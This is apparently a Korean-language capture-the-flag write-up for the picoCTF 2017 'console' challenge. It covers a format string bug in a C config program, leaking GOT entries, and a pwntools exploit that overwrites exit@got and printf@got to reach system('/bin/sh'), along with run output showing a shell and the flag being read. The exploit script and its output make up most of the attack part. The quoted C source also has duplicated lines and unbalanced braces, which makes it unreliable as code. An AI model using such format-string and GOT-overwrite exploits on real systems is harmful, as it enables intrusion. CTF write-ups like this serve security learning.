`#FBS`, `#GOT Overwrite`  
# 목차
1. [Description](#description)
2. [Analysis](#analysis)
3. [Exploit code](#exploit-code)

## Description
[console](https://webshell2017.picoctf.com/static/253637e2bb3eb1c13b3072633a9b5714/console)  
[config-console.c](https://webshell2017.picoctf.com/static/253637e2bb3eb1c13b3072633a9b5714/config-console.c):
```
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

FILE *log_file;

void append_command(char type, char *data) {
    fprintf(log_file, "%c %s\n", type, data);
}

void set_login_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Login message set!\n%s\n", message);

    append_command('l', message);
    exit(0);
}

void set_exit_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Exit message set!\n");
    printf(message);

    append_command('e', message);
    exit(0);
}

void set_prompt(char *prompt) {
    if (!prompt) {
        printf("No prompt chosen\n");
        exit(1);
    }
    if (strlen(prompt) > 10) {
        printf("Prompt too long\n");
        exit(1);
    }
    printf("Login prompt set to: %10s\n", prompt);

    append_command('p', prompt);

    append_command('p', prompt);
    exit(0);
}

void print_help() {
    printf(
        "You can:\n"
        "    login <login-message>    set the login message\n"
        "    exit <exit-message>      set the exit message\n"
        "    prompt <prompt>          set the command prompt\n"
    );
}

void loop() {
    char buf[1024];
    while (true) {
        printf("Config action: ");
        char *result = fgets(buf, 1024, stdin);
        if (!result) exit(1);
        char *type = strtok(result, " ");
        if (type == NULL) {
            continue;
        }
        char *arg = strtok(NULL, "\n");
        switch (type[0]) {
        case 'l':
            set_login_message(arg);
            break;
        case 'e':
            set_exit_message(arg);
            break;
        case 'p':
            set_prompt(arg);
            break;
        default:
            printf("Command unrecognized.\n");
            /* Fallthrough */
        case 'h':
            print_help();
            break;
        }
    }
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Requires log file\n");
    if (argc != 2) {
        fprintf(stderr, "Requires log file\n");
        return 1;
    }
    log_file = fopen(argv[1], "a");

    setbuf(stdout, NULL);
    loop();
    return 0;
}
```
## Analysis
```
    31      printf(message);
```
31번째 줄에 포멧스트링 버그 가 있는걸 확인  

```
Config action: e %p%p%p%p e %p%p%p%p%p%p%p%p
Exit message set!
0x7f159f7bb3230x7f159f7bc7a00x7f159f4f0c000x7f159f7bc7a0 e (nil)(nil)0x7ffc71f38b320x7ffc71f38f400x400aa6(nil)0x7ffc71f38b300x7ffc71f38b30
```
64비트임  
  
```
  400690:       ff 25 72 0b 20 00       jmpq   *0x200b72(%rip)        # 601208 <puts@GLIBC_2.2.5>
  4006a0:       ff 25 6a 0b 20 00       jmpq   *0x200b6a(%rip)        # 601210 <strlen@GLIBC_2.2.5>
  4006b0:       ff 25 62 0b 20 00       jmpq   *0x200b62(%rip)        # 601218 <setbuf@GLIBC_2.2.5>
  4006c0:       ff 25 5a 0b 20 00       jmpq   *0x200b5a(%rip)        # 601220 <printf@GLIBC_2.2.5>
  4006d0:       ff 25 52 0b 20 00       jmpq   *0x200b52(%rip)        # 601228 <__libc_start_main@GLIBC_2.2.5>
  4006e0:       ff 25 4a 0b 20 00       jmpq   *0x200b4a(%rip)        # 601230 <fgets@GLIBC_2.2.5>
  4006f0:       ff 25 42 0b 20 00       jmpq   *0x200b42(%rip)        # 601238 <fprintf@GLIBC_2.2.5>
  400710:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        # 601248 <fopen@GLIBC_2.2.5>
  400720:       ff 25 2a 0b 20 00       jmpq   *0x200b2a(%rip)        # 601250 <strtok@GLIBC_2.2.5>
  400730:       ff 25 22 0b 20 00       jmpq   *0x200b22(%rip)        # 601258 <exit@GLIBC_2.2.5>
  400740:       ff 25 1a 0b 20 00       jmpq   *0x200b1a(%rip)        # 601260 <fwrite@GLIBC_2.2.5>
```
GOT를 leak 해보자.  

```
strlen 0x4006a6
setbuf 0x7fef3db63070
printf 0x7fb2b9f6fcf0
__libc_start_main 0x7f9240cf7a50
fgets 0x7fa301905df0
fprintf 0x4006f6
fopen 0x7f41455810a0
strtok 0x7f7a6e761a60
exit 0x400736
fwrite 0x400746
```

GOT leak 을 해보니 `ASLR on` 이었다.  
  
FSB 를 일으키려면 set_exit_message() 로 들어가야하는데  
set_exit_message() 는 항상 마지막에 exit() 을 실행한다.  
그래서 다시 connection 을 해야하는데  
ASLR 이 걸려있어서 libc 위치가 바뀐다.  
  
그래서 connection을 유지한 채  
여러번 공격 및 leak 해야하기 때문에  
종료되지 않게 loop 되도록 **조작**한다.  
  
exit@.got 를 사용자 정의함수 loop() 로 **GOT overwrite** 한다.  
  
그리고 picoCTF에서 준 ssh계정으로 **라이브러리**를 가져온다.  
  
exploit code:  
	1. exit@got 를 sym.loop() 로 GOT overwrite
	2. (한번이상 사용된) 라이브러리 함수의 GOT 를 leak 해서 LIBC_BASE 를 구함 (e.g. fopen)
	3. printf@got 를 imp.system() 으로 GOT overwrite
	4. imp.system() 의 인자가 될 "/bin/sh" 를 넘기기
	5. cat flag.txt. That's it!
  
  
  
GOT overwrite 가 가능한 조건은 `Full RELRO` 가 아니면 된다.  
  
## Exploit code
```
from pwn import *

def dump(addr):
    r.sendline('e |%27$s|abc'.ljust(104,'A')+p64(addr))
    return r.recvuntil('|abc').split('|')[-2]

def hhn8(target, to):
    p = 'e '
    to = map(ord,p64(to))
    p += '%{}c%{}$hhn'.format(to[0]+0x100, 27)
    p += '%{}c%{}$hhn'.format(to[1]+(0x100-to[0]), 28)
    p += '%{}c%{}$hhn'.format(to[2]+(0x100-to[1]), 29)
    p += '%{}c%{}$hhn'.format(to[3]+(0x100-to[2]), 30)
    p += '%{}c%{}$hhn'.format(to[4]+(0x100-to[3]), 31)
    p += '%{}c%{}$hhn'.format(to[5]+(0x100-to[4]), 32)
    p += '%{}c%{}$hhn'.format(to[6]+(0x100-to[5]), 33)
    p += '%{}c%{}$hhn'.format(to[7]+(0x100-to[6]), 34)
    p = p.ljust(104, 'A')
    p += p64(target)
    p += p64(target+1)
    p += p64(target+2)
    p += p64(target+3)
    p += p64(target+4)
    p += p64(target+5)
    p += p64(target+6)
    p += p64(target+7)

    r.sendline(p)
    r.recvuntil(': ')

def main():
    r.recvuntil(': ')

    # make loop
    hhn8(EXIT_GOT, LOOP_OFFSET)

    # leak LIBC_BASE
    fopen = u64(dump(FOPEN_GOT).ljust(8, '\0'))
    LIBC_BASE = fopen - LIBC_FOPEN

    # GOT overwrite to system
    hhn8(PRINTF_GOT, LIBC_BASE+LIBC_SYSTEM)

    # system('/bin/sh')
    r.sendline('e /bin/sh')

    r.interactive()

if __name__ == '__main__':
    r = remote('shell2017.picoctf.com', 49158)
    LOOP_OFFSET = 0x4009bd
    EXIT_GOT = 0x601258
    FOPEN_GOT = 0x601248
    PRINTF_GOT = 0x601220
    LIBC_FOPEN = 0x6a0a0
    LIBC_SYSTEM = 0x41490
    main()
# de61fcdecad9554d1f43d147b06f9dcc
```
```
[+] Opening connection to shell2017.picoctf.com on port 49158: Done
[*] Switching to interactive mode
Exit message set!
                                                                                                                                                                                                                                                                                                                                                                                                               #                                                                                                                   \xa0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \x00                                                                                                                                                                                                                                                    \xa0                                                                                       &                                                                                                                                                                                                                                                                                                                                            \x00                                                                                                                                \xa2                                                                                                                                                                                                                                                               \xb0AAAAAAA \x12`sh: 1: Config: not found
Exit message set!
$ ls
console
flag.txt
xinetd_wrapper.sh
$ cat flag.txt
de61fcdecad9554d1f43d147b06f9dcc
$
```
